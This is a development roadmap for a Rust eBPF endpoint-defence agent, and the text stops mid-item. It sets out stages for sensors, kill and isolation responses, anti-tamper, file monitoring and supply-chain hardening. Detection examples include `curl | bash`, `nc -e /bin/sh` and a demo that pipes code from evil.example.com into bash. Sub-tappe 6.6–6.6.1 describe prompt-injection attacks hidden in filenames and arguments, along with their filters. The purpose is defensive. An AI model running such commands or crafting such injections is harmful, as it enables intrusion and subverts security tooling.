# NorthNarrow — Execution roadmap

> **Current state: [`docs/roadmap/CAPABILITY_PROGRAM.md`](docs/roadmap/CAPABILITY_PROGRAM.md).**
> This roadmap keeps its plans and dates as they were written. Some of
> them, and some "in progress" states, are older than the current state:
> since 20 October 2026 (Wave 4) the work is tracked capability by
> capability in
> `docs/roadmap/CAPABILITY_PROGRAM.md`, and what each release contains is in
> `CHANGELOG.md` (the first alpha is `0.1.0-alpha`). Where the two disagree
> with this file, they are the current source.
>
> A *Tappa* (Italian for "stage"; plural *Tappe*) is one step of this
> roadmap. The word stays as it is because the code, the tests and other
> documents use it.

> Linux first. 100% Rust. One Tappa at a time, in a fixed order.
> None is skipped. There is no going back. A visible demo at every Tappa.

For the full long-term map (Ring -1 hypervisor, anti-DMA, CET, PQC,
honeypots, micro-segmentation), see VISION_TECHNICAL.md.
That is the north star. This is the working plan.


## Progress (updated on 16 October 2026)

| Tappa | State | Reference |
|---|---|---|
| 0 – 5 | closed | workspace, eBPF sensors, decision engine, KillProcess, response engine |
| 6 (6.1 → 6.9.7) | closed; ADE removed | adaptive posture (stays); ADE on Candle, anti prompt-injection, RAG KB, XAI and performance removed in Wave 4 (lab PR 214) |
| 7 | closed | anti-tamper (task_kill, ptrace, inode_protect, watchdog respawn v2) |
| 8 | closed | COMBAT unlock with an Ed25519 signature, signed audit log |
| 9 (FIM) + 9.0.a/b/c | closed | File Integrity Monitoring, detections on a signed chainlog, triage |
| 9.5 + 9.5.1 | closed | canary tokens and anti-tamper honeypots |
| 10 (network) + 10.5 + 10.6 | closed | network observability, 69 rules at closing (76 today), detection depth |
| 10.7 | in progress | adversarial validation through Kali (design closed, automated range) |
| **10.8** | **in progress** | reliability: hardening 8–10 Oct, upgrade/uninstall, signed release, multi-kernel (4 kernels), 24 h soak, fuzzing, io_uring (first part), BPF self-defence, anti-tamper adversarial, overhead on 6.8, `.deb`/`.rpm` packages; still open: the 72 h soak, the overhead on the other guests, the `.rpm` signing key (a maintainer action) and the lab check of kernels from 6.9 (`inode_setattr`, handled by lab PR 164; Debian 13 / 6.12 checked on 16/10: chmod, chown and touch of a protected file refused; 81 privileged tests out of 82, the failed one — DNS attribution — also fails on main because of the guest's resolver) |
| 10.9 | in progress | evasion coverage: cgroup/container context, runtime injection, encrypted DNS/tunnels (decided on 10 October after an external review); sensor attach point: design accepted, step 0 passed on 6.8, 6.1 and 5.15, steps 1 (file opens on LSM), 2 (exec on LSM) and 3 (DNS read from the socket buffer, IPv6 too) done on 12 October |
| External audit of `16f7563` | Waves 0–2 closed, Wave 3 not started | 444 findings: Waves 0 and 1 (6 Critical, 70 High) and Wave 2 (159 Medium) closed, Wave 3 (188 Low, 21 Info) not started; follow-ups found in the lab still to close. Register: `docs/audit/EXTERNAL_AUDIT_16f7563.md`; operator notes: `docs/operator/UPGRADE_NOTES_AUDIT_16f7563.md` |
| Local UI, proactive Scout | not started | moved after 10.9, numbering to be confirmed by the founder |
| 11 – 17 | not started | Windows, EU backend, console, advanced hardening, beta, launch |

Tagged release: `v0.0.1-tappa9.0` (9 October 2026) — everything up to Tappa 9.0 plus the
hardening round. Defect registers: `docs/audit/NN_BUG_AUDIT_2026-06-09.md`,
`docs/audit/NN_REVIEW_2026-10-08.md` (High and Medium all closed by 9 October),
`docs/audit/EXTERNAL_AUDIT_16f7563.md` (external audit of 12 October: Critical, High and
Medium closed by 16 October, with the follow-ups found in the lab).

Product decision of 15 October 2026 (lab PR 134): the ADE is an advisor. A
model verdict that names an action (Kill, KillTree, Quarantine, BlockNetwork,
Isolate) is recorded as a recommendation, with the model's reasoning, and is not
carried out; responses stay with the deterministic rules and the COMBAT ladder.
`NN_ADE_ENFORCE=1` turns execution back on and is recorded as a weakening
variable in the signed audit log.

Product decision of 20 October 2026 (Wave 4, lab PR 214): the on-host LLM
advisor is removed — the ADE, the RAG KB, the XAI, the candle fork and every
model and tokenizer dependency. A model of several GB inside the agent's root
process, fed with strings written by the attacker, was the agent's largest
attack surface; its accuracy was never measured; it cost GBs of RAM on
servers; mature EDRs keep on-host detection deterministic (an AI assistant,
if there is one, stays outside the enforcement path, for example a future
assistant for the analyst on the backend). Detection stays deterministic:
rules, correlation, posture, COMBAT. The ADE's flags and variables are
ignored with a WARN
(`docs/operator/UPGRADE_NOTES_WAVE4.md`).

---

## Tappa 0 — Repository foundations

Goal: a Rust workspace structure ready to build on.

- Cargo workspace with members: agent/, common/, cli/
- Base dependencies: tokio, tracing, serde, anyhow, thiserror
- Minimal CI (cargo build, cargo test, cargo clippy, cargo fmt)
- Clean README, LICENSE (Apache-2.0), CONTRIBUTING

Demo: `cargo build` green on Linux x86_64.

---

## Tappa 1 — First Rust eBPF sensor (Aya)

Goal: see every process that starts on the system.

- Rust eBPF program with the Aya framework, no_std
- Tracepoint on sched_process_exec
- Rust userland reads events through a ring buffer
- Events serialised in the canonical Event::ProcessSpawn format

Demo: you start the agent, open a terminal, run `ls`. The agent prints
"ProcessSpawn pid=X comm=ls cmdline=..."

---

## Tappa 2 — Basic decision engine (hardcoded rules)

Goal: a first brain. No LLM yet. Only explicit rules.

- decision::rules module with ~10 initial rules (hardcoded)
- Examples: `curl | bash`, `chmod +x /tmp/*`, `nc -e /bin/sh`
- Output: Verdict { action: ResponseAction, severity: Severity }
- ResponseAction = enum (Log, KillProcess, BlockOutbound, ...)
  but for now ONLY Log is carried out

Demo: run `curl evil.example.com | bash`. The agent logs
"VERDICT: KillProcess (severity: High) — would kill pid X" but the
process goes on. You see that the brain reasons.

---

## Tappa 3 — Hands that strike: real KillProcess

Goal: the FIRST TIME NorthNarrow really kills something.

- response::executor::kill module
- kill_process(pid) through nix::sys::signal::kill(SIGKILL)
- kill_process_tree(pid) walks /proc to find the children
- Wiring in the decision engine: if verdict = KillProcess, really do it
- Test: spawn a fake process (sleep 1000), simulate a KillProcess
  verdict, assert that it is dead in <100ms

Demo: repeat the Tappa 2 test. This time the bash is KILLED.
NorthNarrow is now a defender, no longer an observer.

---

## Tappa 4 — Complete eBPF sensors

Goal: full coverage of the relevant events.

- LSM hook bprm_check_security (exec control)
- LSM hook file_open (FIM file integrity monitoring)
- Kprobe on tcp_v4_connect and tcp_v6_connect (outgoing network)
- Kprobe on udp_sendmsg to filter DNS queries
- All sensors in Rust+Aya, no C, no_std

Demo: a multi-category event stream visible in real time.

---

## Tappa 5 — Complete response executors

Goal: all the concrete defensive actions, not only Kill.

- BlockOutbound(pid) — nftables through the rustables crate or syscalls
- FullNetworkIsolation — drop everything except mTLS to the C2
- Quarantine(path) — moves the file to /var/lib/northnarrow/quarantine/,
  encrypted with AES-256-GCM (the pure Rust aes-gcm crate)
- ThrottleProcess(pid) — cgroup v2 CPU/IO limits

Demo: a fake ransomware encrypts files in /tmp/lab/. NorthNarrow
kills the process + isolates the machine + quarantines the binary.
All in <500ms.

---

## Tappa 6 — Local LLM brain (Candle)

> Historical: the on-host LLM advisor was removed in Wave 4, lab PR 214. What remains of Tappa 6 is
> Sub-tappa 6.5 (adaptive posture), without the modulation of the model's verdicts.

Goal: heuristic decisions on ambiguous cases.

- candle-core + candle-transformers crates (100% Rust, zero C/C++)
- Q4 quantised model (Gemma 2B or Mistral 7B Q4)
- Local inference, <2GB RAM
- Pipeline: the hardcoded rules (Tappa 2) decide first. Ambiguous cases
  go to the LLM with a structured prompt
- LLM output: {verdict, confidence, reasoning}. If confidence 
  threshold → human escalation (level B)

Demo: an unknown binary is run. The rules do not classify it.
The LLM analyses it (filename, syscalls, network behaviour) and decides.
Since 15 October 2026 (lab PR 134) the model's decision is a
recorded recommendation, not an action: see the progress section.

### Sub-tappa 6.1 — Real candle backend (closed)

- Candle Llama 3.1 GGUF Q4_K_M backend, 100% Rust.
- Foundation-Sec-8B-Reasoning as the default model.
- Runnable smoke test + bench example.
- Prefill/decode tracing + ADE_DEMO_LIMIT.

### Sub-tappa 6.5 — Adaptive Defensive Posture (closed)

- A 4-tier state machine, persistent across events: OBSERVING → ALERTED
  → ENGAGED → COMBAT (ordered by severity).
- `agent::posture::PostureMachine` as an Arc-backed handle,
  Send + Sync. `observe(event, recent_events)` reports events and
  returns Some(state) on transitions; `modulate_verdict(v)`
  applied severity inflation + Allow→Alert in ALERTED+ to the ADE's
  verdicts (removed with the ADE in Wave 4, lab PR 214); `tick_decay`
  makes the posture decay (1h ALERTED→OBSERVING, 24h ENGAGED→
  ALERTED, COMBAT never).
- `common::posture_types` for the serialisable types (audit log).
- 12 trigger types (Reconnaissance, SuspiciousDns, SensitiveFileAccess,
  Lolbas, ExploitAttempt, AdjacentCompromise, HeavyReconnaissance,
  CriticalFileModification, ConfirmedIntrusion, PersistenceMechanism,
  LateralMovement, ExfiltrationPattern).
- Decay timer on `std::time::Instant` (immune to NTP).
- Exit from COMBAT: stub `admin_release_combat(bool)`. Tappa 8
  replaces it with an Ed25519 verifier.
- ADE schema unchanged (v1.0.0). The modulation keeps the rule
  `Allow ⇔ severity == None`.

Structural differentiator: all commercial EDRs in 2026
evaluate events in isolation. NorthNarrow does not — the posture
remembers what it has seen and becomes more aggressive as the
evidence builds up.

Demo: `cargo run -p northnarrow-agent --release --example
posture_demo --features posture-demo` shows the OBSERVING→ALERTED→ENGAGED→
COMBAT transitions and COMBAT held (the Allow→Alert modulation left with the
ADE in Wave 4).

### Sub-tappa 6.6 — ADE Hardening against Prompt Injection (closed)

Goal: make the ADE robust to filenames/argv/env crafted by the
attacker to pose as instructions to the model.
Defence in depth (4 layers):

1. **Sanitization preprocessing** (`agent::ade::sanitize`):
   filters instruction keywords, special chat-template tokens
   (Llama 3.1, ChatML), Cyrillic/Greek homoglyphs, zero-width chars,
   bidi-control, non-printable, overlong argv. It computes an
   `injection_score` 0..1.
2. **Structured prompting** (`agent::ade::structured_prompt`):
   wraps the untrusted fields in XML-style delimiters
   (`=== UNTRUSTED EVENT DATA ===`) and presents them both in base64 and
   decoded, with "treat as opaque data" priming before and after.
3. **Post-verdict sanity check** (`agent::ade::sanity_check`):
   catches inconsistent verdicts (high injection_score + Allow,
   tactic TA0040/TA0010 + Allow, severe IoC + Low) and replaces them
   with a synthetic, schema-valid Escalate Tier1. Less serious
   inconsistencies are only flagged in metadata.
4. **Dual-model verification stub** (`agent::ade::dual_verify`):
   for Kill/KillTree/Quarantine/Isolate/BlockOutbound/Throttle
   it needs the go-ahead from `DeterministicVerifier` (no Kill on
   pid<1000, Isolate only with severity Critical, Kill conf≥0.70,
   etc.). Tappa 6.6+ will replace it with a second LLM call.

Early reject: `injection_score ≥ 0.90` causes a synthetic Escalate
without spending an inference round-trip.

Demo: `cargo run -p northnarrow-agent --release --example
ade_attacks` runs 40 synthetic attacks, classified in 7
categories (direct injection through the filename, indirect through comm/argv,
encoding evasion, multi-language, schema exploits, context
flooding, social engineering), and produces a
BLOCKED/PARTIAL/FOOLED report per category. It needs the GGUF model
loaded (~7-20 min on CCX23). The 4 layers + the schema parser
catch most attack families before the
model sees them.

ADE schema unchanged (v1.0.0). Posture machine (Sub-tappa 6.5)
not changed. Rule engine, sensors, executor not changed.

### Sub-tappa 6.6.1 — Extended Layer 1 detectors (closed)

Closes the 4 attack families that in 6.6 got past Layer 1
(sanitization) and reached Layer 3/4:

- **Multilingual keyword dictionary** — IT/ES/FR/DE/PT/RU/ZH/JA/AR.
  Detection runs on three views: the raw truncated input (to
  catch Cyrillic / Han / Arabic before the homoglyph
  replacement), the sanitised `buf` (for Latin), and the
  normalised `lower`+`_-.→space`. New flag
  `MultilingualKeyword { lang, keyword }`.
- **ROT13 normalizer** — on ASCII strings of length ≥ 8 without
  non-Latin characters, it applies `normalize_rot13` and checks again
  against the EN dictionary. New flag
  `RotEncoded { original, decoded }`.
- **Visual substitution detector** — compares the basename of the
  filename against a list of system binaries
  (`SYSTEM_BINARY_LOOKALIKES`: ls, ssh, sudo, …) using a
  lookalike table (`l↔1↔I↔|`, `s↔5↔$`, `o↔0↔O`, …). A match
  when every position that differs is a registered lookalike.
  New flag `VisualSubstitution { suspected_target, actual }`.
- **Variant separator detector** — recognises
  `northnarrow-`/`_`/`.`/`|`/space (and the like for `system:`,
  `[INST]`, etc.) as attempts to evade the canonical match
  `northnarrow:`. New flag
  `VariantSeparator { canonical, variant }`.

Score weights: each of the 4 new flags weighs 0.40-0.45 (in line
with `InstructionKeyword`); HomoglyphDetected goes up from 0.20 to 0.30
to reflect its multi-script nature.

12 new unit tests in the `agent::ade::sanitize::tests` module.

Effect on the `ade_attacks` demo: D1, D2, C4, G3, G4 — the 5 attacks
that in 6.6 were marked as "slip Layer 1" — now produce
`injection_score ≥ 0.40` at the first layer, in many cases
enough to trigger the Tier1Review early reject (threshold 0.90)
when combined with other signals.

ADE schema unchanged (v1.0.0). Posture machine, structured prompt,
sanity check, dual verify (the other 3 layers of Sub-tappa 6.6)
not changed.

### Sub-tappa 6.7 — Architectural RAG knowledge base (closed)

Adds a Retrieval-Augmented Generation layer between the event
and the inference: before the ADE calls the model, a local curated
knowledge base of 30 documents is queried through cosine
similarity, and the most relevant hits are injected into the prompt
as a TRUSTED block. Result: the ADE recognises TTPs, IoCs and
threat tooling that the base model does not know
(post-knowledge-cutoff).

Components:

- `common::rag_types` — serialisable types (`KbCategory`,
  `KbDocument`, `RagDocument`, `RagResult`, `KB_EMBEDDING_DIM=384`).
- `agent::rag::embedder` — `RagEmbedder` with a deterministic embedding
  through FNV-1a-hashed character 3- and 4-grams in 384 buckets,
  L2-normalised. A stand-in for a future bge-small-en-v1.5 loaded
  through candle.
- `agent::rag::store` — in-memory `RagStore` with a linear
  cosine top-k scan, filtered by a similarity threshold. Chosen instead
  of LanceDB because lancedb 0.10 pulls in datafusion + arrow-array
  and doubles the compile time, with no benefit at the scale of
  30 documents (the linear scan takes microseconds).
- `agent::rag::retrieval` — `RagEngine::with_seed(model_path)` +
  `retrieve(RagQuery)`. Default top_k=3, min_similarity=0.15
  (tuned on the n-gram stand-in; with a real bge-small it should
  be raised to ~0.4).
- `agent::rag::kb_seed` — 30 hardcoded documents, split
  exactly as the spec says: 10 MITRE techniques, 5 Sigma rules, 5
  LOLBAS, 5 Linux patterns, 5 threat tools.
- `agent::ade::rag_integration` — `build_rag_query_from_event`
  (process spawn → "process {comm} from {filename}", DNS →
  "dns query from {comm} to {qname}", TCP → "...port {port}", …)
  and `format_rag_block` (renders a RagResult as a TRUSTED block in the
  structured prompt, placed after the host context and before the
  untrusted data).
- `agent::ade::AdeEngine::with_rag(rag)` — opt-in wiring that
  keeps the pre-6.7 behaviour byte for byte when the
  RAG is absent (all existing tests keep passing).

Examples (manual run, not in CI):

- `examples/rag_demo.rs` — 5 canonical queries → top-3 hits per query.
- `examples/ade_with_rag.rs` — the same event (Cobalt Strike beacon)
  evaluated side by side with and without RAG.

Tests: 32 new always-on tests (8 embedder, 7 store, 4 kb_seed, 8
retrieval, 5 rag_integration). 0 ignored tests added by 6.7. ADE
schema unchanged (v1.0.0).

Deviations from the spec (allowed by the spec itself, documented
in the commits):

- LanceDB → custom in-memory vector store (dependencies too heavy).
- bge-small candle → hashed n-gram embedder (BERT GGUF is not
  first-class in candle 0.10, outside the MINIMAL scope).

Material for Sub-tappa 6.7+: loading a real bge-small through
candle, on-disk persistence of the KB, ingestion from MITRE GitHub /
Sigma / LOLBAS, threshold tuning with semantic embeddings.

### Sub-tappa 6.8 — Performance Optimization Pass (closed)

Three CPU-side levers to bring the ADE's end-to-end latency from
~25 minutes (1500 tokens at 0.94 tok/s decode on Hetzner CCX23) towards
the ~5 minutes needed for real-time use, with no GPU, no schema
redesign, no change of model (Foundation-Sec 8B Q4_K_M stays).

Layers introduced:

- **Layer 1 — Hardware diagnostic.** `examples/diag_hw.rs`
  prints the CPU model, ISA flags, physical/logical cores, RAM, and two
  micro-benchmarks (single-thread f32 matmul + 1 GB sequential read)
  that tell whether the deployment host is compute-bound or
  memory-bound. CCX23 baseline: AMD EPYC Milan, AVX2+FMA+F16C,
  ~19 GFLOPS single-thread, ~36 GB/s — documented in
  `docs/PERFORMANCE_HARDWARE.md`.
- **Layer 2 — Build flags.** `.cargo/config.toml` exports
  `target-cpu=native` (FMA + AVX-512 when present).
  `[profile.release]` goes from `lto = "thin"` to `lto = "fat"`,
  `codegen-units = 1`, `panic = "abort"`, `opt-level = 3`. Build
  time ~30 s → ~160 s on CCX23 (peak link RAM ~6-8 GiB, manageable).
  A separate `release-bench` profile keeps the symbols for `perf`.
  Expected speedup: 1.3-1.5× on the candle CPU kernels.
- **Layer 3 — Thread tuning.** `AdeConfig` exposes
  `num_threads: Option<usize>` with `effective_threads()`, which
  defaults to `physical_cores − 1`. `CandleBackend::configure_threads`
  pins `RAYON_NUM_THREADS` before the first init of the global rayon
  pool. The CLI `--ade-threads N` overrides it. `examples/bench_threads.rs`
  walks N ∈ {1,2,3,4} in subprocesses (rayon is lazily initialised once
  per process) and prints the optimum. Documented in
  `docs/PERFORMANCE_THREADS.md`.
- **Layer 4 — Streaming + early JSON termination.** The biggest
  lever. `InferenceBackend.generate_streaming` (with
  `StreamControl::Continue|Stop`) is optional, and the default impl
  falls back to `generate` with a single final callback (Mock + the other
  backends stay byte-compatible). `CandleBackend` implements
  real streaming: after each decoded token, an incremental tokenizer.decode
  produces only the new suffix, aware of UTF-8
  boundaries. `agent::ade::streaming_parser::StreamingJsonDetector`
  tracks brace depth, string mode and escape mode along the stream
  and signals completion at the first outermost `}`.
  `AdeEngine::evaluate` wires detector + `Stop`: as soon as the JSON
  closes, the decode loop stops. Expected: ~1500 → ~400-500
  decoded tokens per inference, a 3-4× wall-time saving on
  memory-bound hosts.
- **Layer 5 — Persistent backend audit.** Checked by
  inspection that `AdeEngine::new` is called only once
  in `agent/src/main.rs`, outside the event loop, and that the resulting
  `Arc<AdeEngine>` is shared in `process_event` on every iteration.
  A comment guard was added at the construction site to prevent
  future regressions.

Tests: 12 new always-on tests (8 `StreamingJsonDetector` + 3
`AdeConfig::effective_threads` + 1 streaming/non-streaming
verdict-equality integration test). Workspace total: 277 tests passed,
0 failed, 5 ignored. `AdeVerdict` schema unchanged (v1.0.0).
ADE pipeline (sanitize, sanity_check, dual_verify, RAG, posture)
unchanged.

Combined theoretical speedup (NOT measured in autopilot — to be
benchmarked by the founder with `bench_threads` + a real run of
`ade_demo` after the deploy): ~5×, about ~5 minutes for a typical
1500-token output on CCX23.

Out of scope, postponed to later sub-tappe:

- GPU / Metal / CUDA support → Sub-tappa 6.9+.
- Schema redesign for a compact output → Sub-tappa 6.9 Compact
  Output (it would make streaming less necessary, but the two are
  orthogonal and independent).
- A smaller model (Foundation-Sec 8B stays the production
  choice).
- Speculative decoding / draft models.

Allowed deviations from the spec, documented in the commits:

- `lld` is not available on the CCX23 host (May 2026); the
  `-fuse-ld=lld` link-arg was left out, and the default linker
  kept. Build time is ~30 s longer than with the hypothetical
  lld, which is acceptable.
- The default `effective_threads()` returns 1 on the CCX23
  (2 physical → 2-1 = 1), but the expected bench finds 2-3
  as the real optimum; the default is conservative, the CLI
  override is the production path.

---

## Tappa 7 — Linux anti-tamper

Goal: the agent cannot be killed or disabled.

- BPF-LSM hook task_kill — denies SIGKILL/SIGTERM to the agent's
  PID (except for an Ed25519-signed channel)
- BPF-LSM hook ptrace_access_check — denies ptrace to the daemon
- Protection of the /var/lib/northnarrow/ filesystem (chattr +i + LSM)
- Watchdog: a second process that restarts the daemon if it goes down

Demo: `sudo kill -9 <pid_agent>` → the signal is DENIED by the
kernel. Even root does not kill it.

---

## Tappa 8 — Supervised reactivation (cryptographic seal)

Goal: a network isolation that is lifted only with an admin key.

- An ed25519-dalek key pair. The public key in the daemon, the private
  key in the company Key Vault (offline or HSM)
- Isolation state persisted in an immutable file (chattr +i)
- At boot, the agent reads the state. If "isolated" → it blocks the network
  through nftables/XDP at start, before it touches the OS
- Unlock command: an Ed25519-signed token entered by the admin through the
  local CLI. Signature check → the network is released
- An emergency recovery key generated at install, to be kept in the
  company safe

Demo: an isolated machine. Reboot. It stays isolated. The admin enters a
signed token → the network comes back up.

---

## Tappa 9 — File Integrity Monitoring (closed)

Goal: filesystem integrity as a first-class signal.

- LSM sensors `inode_create/unlink/rename/link/setattr`, `file_open`,
  `file_permission`, `file_free_security` (8 observe programs)
- Signed baseline (`fim_baseline.jsonl`) + chained drift log; TOFU
  at first start, `fim-paths.v1` + `.local` overlay
- Roles `fim-manage` / `fim-read`; ADE prompt for critical FIM events
- 9.0.a/b/c: detections persisted on a signed chainlog, read with
  `nn-admin detections` (role `telemetry-read`), event-sourced triage
  (`detection-set-status`, role `triage`)

Design: `docs/design/TAPPA9_FIM_DESIGN.md`,
`docs/operator/TAPPA9_FIM_TRUST_MODEL.md`.

---

## Tappa 9.5 — Deception layer / canary token (closed)

- Credential canaries (aws, azure, gcp, docker, generic) rendered
  from templates, a chained registry, firing on READ and on exec; since lab PR 163
  also the network canary: it fires when a local process connects to
  its address and port (the agent opens no listener)
- 9.5.1: anti-tamper honeypot — 10 decoy files on the control
  surface (`/etc`, `/var/lib`, `/run`), rule NN-L-FIM-024
- Roles `canary-manage` / `canary-read`; path policy on the deploy

Design: `docs/design/TAPPA9_5_DECEPTION_LAYER_DESIGN.md`,
`docs/design/TAPPA9_5_1_ANTITAMPER_HONEYPOT_DESIGN.md`.

---

## Tappa 10 — Network observability (closed)

- kprobe `tcp_connect` v4/v6, fexit `tcp_close`, kprobe `udp_sendmsg`
  (connected and unconnected), `inet_csk_listen_start`
- Flow tracker with a stable `flow_id`, DNS cache per PID, TLS parser
  with JA3/JA4, IP/CIDR and JA3 blocklist with a `.local` overlay
- 9 NN-L-NET rules, `nn-admin net flows|listeners|resolve|fingerprint`
  (roles `net-read` / `net-manage`), chain log `netflow.jsonl`

Design: `docs/design/TAPPA10_NETWORK_OBSERVABILITY_DESIGN.md`.

---

## Tappa 10.5 — Detection rules at scale (closed)

- A 69-rule engine (process R001–R018, NN-L-FIM, NN-L-NET, …),
  comm allowlist per family with a `.local` overlay
- Per-host correlation, chains CHAIN-004..008

Design: `docs/design/TAPPA10_5_DETECTION_RULES_AT_SCALE_DESIGN.md`.

---

## Tappa 10.6 — Detection depth refit (closed)

- argv and parent context in the `sched_process_exec` tracepoint,
  argv-aware RAG seed, 30-case golden suite

Design: `docs/design/TAPPA10_6_DETECTION_DEPTH_REFIT_DESIGN.md`.

---

## Tappa 10.7 — Adversarial validation through Kali Linux (in progress)

- Design closed with the founder's 10 decisions; automated VirtualBox
  range (`deploy/adversarial/`), Atomic Red Team v2 sweep
  (`docs/adversarial/`)
- To do: run the chains systematically and close the gaps
  found in the register
- Elastic's PANIX (persistence) and FENIX (fileless execution) regression
  suites next to Atomic Red Team (external research of 11 October,
  `docs/design/RESEARCH_TRIAGE_2026-10-11.md`)

Design: `docs/design/TAPPA10_7_ADVERSARIAL_VALIDATION_DESIGN.md`.

---

## Tappa 10.8 — Reliability, multi-kernel compatibility, supply chain (in progress)

Goal: NorthNarrow can be installed, upgraded and verified on a
real host, not only on the development kernel. Cross-cutting work: it does
not change the order of the later Tappe.

Closed (8–9 October 2026):
- Hardening round: 27 findings from the audit and review registers
  (CAP_KILL, kill-tree, quarantine, task_kill deny-by-default, watchdog
  respawn v2, writable audit chain, unconnected UDP, per-session COMBAT
  ledger, …) — all verified in the QEMU lab
- Lab `deploy/lab/nn-lab.sh`: four guests (Ubuntu 24.04 / 6.8,
  Debian 12 / 6.1, Ubuntu 22.04 / 5.15, AlmaLinux 9 / 5.14 with SELinux
  enforcing), nightly with e2e (agent, FIM, watchdog), ignored suites,
  install, upgrade, uninstall, respawn-check; reports in
  `~/.cache/nn-lab/<distro>/reports/`; `soak start|wait|report` for the
  endurance tests (10 October)
- `install.sh --upgrade` and `uninstall.sh` (order imposed by the anti-tamper)
- Release on a `v*` tag: tarball, CycloneDX SBOM, `SHA256SUMS`,
  SLSA provenance attestation (`gh attestation verify`)

- Multi-kernel, level 1 (9 October): BTF offsets resolved at runtime
  from the live kernel's BTF and published in the `BTF_OFFSETS` map before
  the attach; variants for `iov_iter` (≤ 6.3), the `ITER_UBUF`
  and `ITER_IOVEC` enumerators resolved by name, DNS QNAME also on `ITER_IOVEC`.
  Debian 12 / 6.1 runs all the suites (e2e and ignored) like Ubuntu
  24.04 / 6.8 (finding 27 closed, `docs/operator/KERNEL_COMPATIBILITY.md`)

Planned, in this order:
- Multi-kernel, level 2 (in progress): done on 10 October — optional
  fields (degrade instead of refuse), `--btf-check`, a third guest
  Ubuntu 22.04 / 5.15 verified end to end (three constructs rewritten for
  the old verifier), a matrix computed on BTFHub in CI with a baseline
  (`deploy/btf-matrix/`), a fourth guest AlmaLinux 9 / 5.14 with SELinux
  enforcing (tracepoint layout resolved from tracefs: the RHEL kernel
  shifts the fields by 4 bytes); still open: external BTF for kernels without BTF
- Endurance tests of 24–72 h with synthetic traffic (memory, chain logs,
  LRU maps, timers): the tool is ready (`nn-lab.sh soak`), the first
  24 h run on AlmaLinux 9 passed on 12 October (RSS +0.04 MB/h, no
  restart or error, stable fds); the 72 h need a host that is always on
- Provenance check at install (done on 10 October, lab
  PR 21): `install.sh` checks
  `SHA256SUMS` and the tarball's SLSA attestation (expected builder: the
  release workflow of this repository, no other) and refuses an
  upgrade it cannot verify; the outcome is recorded in the audit log; `cargo audit`
  also on a weekly schedule, not only on pushes, because the SBOM is an
  inventory and must be compared with the advisories again; at start the agent
  compares the hash of its own binary, of the watchdog and of the eBPF object
  with the install's signed manifest (continuous re-verification, not
  only at deploy)
- Host hardening checks (done on 11 October, lab PR 24) in
  `install.sh`, `nn-admin host-check`/`status` and at agent boot:
  the kernel's `lockdown` mode, `kernel.unprivileged_bpf_disabled`,
  `module.sig_enforce`, Secure Boot (efivars), IMA/EVM active, bpffs
  mounted only once; each one missing is a WARN with the fix line,
  because the agent's anti-tamper holds only as long as root cannot rewrite the
  kernel live (kexec, unsigned modules, livepatch)
- Ring buffer loss counters (done on 11 October, lab PR 25): one
  counter per ring in eBPF, read by the agent every 10 s, a WARN at every
  increase, total and detail in `nn-admin status`
- Parser fuzzing (done on 11 October, lab PR 26): eight cargo-fuzz targets
  (admin frame, TLS ClientHello, DNS, BTF, tracefs `format`, roles,
  chain log lines, install manifest) with a CI smoke job; on 11
  October the grafting of management exceptions into the COMBAT rules and
  the canary templates were covered too (lab PR 42), with security properties beyond "no
  panic": no content of the exceptions file can inject a rule
- `io_uring` sensor (done on 11 October, lab PR 27 — first part: observation
  and Log rules; the correlations with the chains and the carve-out by identity
  stay in 10.9): tracepoints on `io_uring_create` and `io_uring_submit`,
  SQE opcodes (open, read/write, connect, send/recv, unlink,
  rename) correlated with process and file; rules on rings used right after
  an exec from a volatile path and on I/O with no matching syscalls (the
  most concrete EDR bypass of 2025–2026: RingReaper)
- BPF ecosystem self-defence (first half done on 11 October, lab PR 28:
  `bpf_map` guard in deny on its own maps, `bpf()` observer with
  Log rules, observe mode in test builds; second half done on 11
  October, lab PR 29: handles to links denied by id and by pin, ids distinct per
  type, link self-check every 10 s with an audit entry, root pin protected
  from unlink, with a purge authorised through the trusted-installer window —
  finding 39 — in `install.sh --upgrade --grant-key` and `uninstall.sh`;
  the telemetry probe is still open): LSM hooks `bpf`/`bpf_prog`/`bpf_map`
  that deny loading, attach, detach, enumeration and map writes to
  anyone who is not the agent; a baseline of the legitimate BPF programs at start;
  a periodic self-check that the agent's links are still attached
- Continuous telemetry probe (done on 11 October, lab PR 30 — first
  part: exec, file open, DNS; TCP network and FIM stay open, because a
  periodic connection and a change to a watched path would
  fire legitimate rules, and they first need the identity exemptions of
  10.9): at intervals the agent generates known, harmless events on each
  sensor and checks that it sees them within a few seconds; a missing event or
  an absent hook = a `telemetry_gap` entry in the signed audit and an ERROR in the
  journal, `telemetry_restored` when it comes back (proof of coverage as a
  product function, not only as a lab test)
- Structured adversarial test of the anti-tamper (first part done on 11
  October, lab PR 31: `nn-lab.sh tamper-check`, 20 cases with an expected outcome and
  evidence in the signed chain logs — signals, ptrace, protected files and pins,
  BPF maps/links/programs, drop-ins and `set-property`, bpffs and bind mounts,
  cgroup freezer, modules, `oom_score_adj`, `.local` overlay; findings
  40–44 found and closed; second part done on 11 October, lab PR 32:
  `cgroup.kill`, saturation with an exec hidden in a flood, io_uring as a
  blind channel — 23 cases, finding 46 closed (every run signs `agent_stop`, the
  next boot states whether the previous one ended cleanly);
  kexec/livepatch/unsigned module with `lockdown` active done on 11
  October, lab PR 43, on Ubuntu 22.04 with `lockdown=integrity`: the agent
  runs unchanged, kexec (C17) and a module with its signature stripped loaded with
  `finit_module` (C27, livepatches included) are refused by the kernel and the
  attempt stays recorded by R018 — 28 cases; `host-check` counts
  lockdown as enforced module signing; every case must end in an
  event in the chain log, not only in a refusal)
- `.local` overlay only through a signed `nn-admin` (done on 11 October, lab
  PR 33): the agent loads an overlay only if `<overlay>.sig` proves that
  a key with the `config-manage` role signed its exact
  content, for this agent and not before the last accepted signature (no
  rollback); otherwise it uses that list's defaults and records
  `unauthorized_overlay`; `nn-admin config overlay set|sign|status`,
  adoption of existing overlays in `install.sh --upgrade`
- Formal verification with Kani after fuzzing (first part done on 11
  October, lab PR 35: the TLS ClientHello cursor and the DNS QNAME scan
  proven for every input of bounded size, a weekly CI job; the
  first proof found a bounds check that overflowed;
  second part done on 11 October, lab PR 44: the quorum rule of the
  administrative signatures, separated from the cryptography and proven — it accepts
  only with enough distinct keys carrying every required role, and
  a threshold of 0 no longer mints an unsigned token in release builds.
  The `unsafe` blocks were assessed: in the agent they are system calls through
  libc, the ring buffer records go through bytemuck's checked API,
  and Candle's FFI is third-party code, so there is no core of our own to
  prove; the other binary parsers are still open)
- Overhead measured on a loaded host (tool done on 11 October, lab PR
